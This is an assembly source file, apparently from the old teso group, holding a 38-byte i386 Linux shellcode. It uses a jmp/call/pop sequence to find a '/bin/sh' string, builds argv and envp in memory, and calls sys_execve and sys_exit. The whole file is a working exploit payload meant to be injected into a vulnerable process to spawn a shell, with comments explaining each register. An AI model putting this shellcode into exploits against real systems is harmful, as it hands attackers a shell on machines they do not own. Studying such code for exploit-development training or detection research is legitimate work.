;------------------------------------------------------------
; ordinary i386/linux-shellcode (38 bytes)
; will exit cleanly after returning from sys_execve
;
; by zap^teso.
;
; linux sys_execve-call:
;   al  : 11 (0x0b)
;   ebx : char * filename
;   ecx : char **argv (argv[0] -> filename, argv[1] -> NULL)
;   edx : char **envp (NULL)
;------------------------------------------------------------

	BITS	32

	jmp	short down
getip:
	pop	ebx			; ebx <- address of shell (char *filename)
	
	xor	eax, eax
	mov	[ebx+7], al		; terminate /bin/sh-string

	lea	ecx, [ebx+8]		; (ebx+8):  char **argv (*filename, NULL)
	lea	edx, [ebx+12]		; (ebx+12): NULL
	mov	[ecx], ebx		; fill in
	mov	[edx], eax		; NULL

	mov	al, 11
	int	80h			; sys_execve

	mov	al, 1
	int	80h			; sys_exit

	; not reached

down:
	call	getip	

shell	db "/bin/sh"
